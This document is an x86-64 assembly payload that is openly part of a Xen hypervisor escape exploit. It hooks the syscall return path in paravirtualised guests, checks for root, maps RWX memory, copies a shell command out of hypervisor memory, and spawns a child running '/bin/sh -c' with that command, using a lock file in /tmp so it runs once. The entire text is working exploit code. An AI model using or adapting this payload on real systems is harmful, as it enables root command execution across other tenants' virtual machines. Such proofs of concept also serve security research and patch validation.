bits 64
default rel

start_of_page:

; entry from sysret after a write syscall.
; R10 contains original RIP.
push r10

; will use rax as scratch reg and syscall number
push rax

; are we root (ruid+euid)? if not, bail out
mov rax, 102 ; __NR_getuid
syscall
cmp rax, 0
jne resume_orig_code
mov rax, 107 ; __NR_geteuid
syscall
cmp rax, 0
jne resume_orig_code

; save registers
push rdi
push rsi
push rdx
push r10
push r8
push r9

; move strings to the stack, can't use HV memory in syscall args
sub rsp, (end_of_strings - start_of_strings)
mov rdi, rsp
lea rsi, [start_of_strings]
mov rcx, (end_of_strings - start_of_strings)
rep movsb

; use a file in /tmp to ensure we only run the command once
mov rax, 2 ; __NR_open
lea rdi, [rsp + (lockfile_path-start_of_strings)]
mov rsi, 0o302 ; O_CREAT|O_EXCL|O_RDWR
mov rdx, 0o600 ; mode
syscall
mov rdi, rax
shr rax, 32
jc restore_regs_and_resume
; the following code is only executed once per PV domain (well, more or less),
; so we can do stuff like creating memory mappings in there.

; close the file again
mov rax, 3 ; __NR_close
syscall

; mmap two normal userspace pages as RWX
mov rax, 9 ; __NR_mmap
mov rdi, 0
mov rsi, 0x2000
mov rdx, 7 ; RWX
mov r10, 0x22 ; MAP_PRIVATE | MAP_ANONYMOUS
mov r8, 0xffffffff
mov r9, 0
syscall

; relocate to the userspace page
mov rdi, rax
lea rsi, [start_of_page]
mov rcx, 0x1000
rep movsb
add rax, (relocated_start - start_of_page)
jmp rax
relocated_start:

; copy the shell command page
lea rdi, [start_of_page + 0x1000]
mov rsi, 0xffff82d0c0006000
mov rcx, 0x1000
rep movsb

; alright! spawn a child to run the shell command.
; use clone() instead of fork() so that we can
; suppress the death signal.
mov rax, 56 ; __NR_clone
mov rdi, 0
mov rsi, 0
mov rdx, 0
mov r10, 0
mov r8, 0
syscall
cmp rax, 0
jne restore_regs_and_resume

; wheee, child context! run /bin/sh -c {shell command}
; no registers in use here, apart from RSP

; calculate addresses of relocated strings
lea r13, [start_of_page + 0x1000] ; shell command
lea r15, [rsp + (dash_c-start_of_strings)] ; dash_c
lea r14, [rsp + (bin_sh-start_of_strings)] ; bin_sh

; construct arguments
mov rax, 0
push rax
mov rdx, rsp
push r13
push r15
push r14
mov rsi, rsp
mov rdi, r14

; do the syscall
mov rax, 59 ; __NR_execve
syscall

; execve failed :( - segfault at a recognizable address
mov rdi, 0x42
mov qword [rdi], 0x42

restore_regs_and_resume:
add rsp, (end_of_strings - start_of_strings)
pop r9
pop r8
pop r10
pop rdx
pop rsi
pop rdi

resume_orig_code:
pop rax
ret



start_of_strings:
lockfile_path: db "/tmp/xen_exploit_sync_file", 0
bin_sh: db "/bin/sh", 0
dash_c: db "-c", 0
end_of_strings:

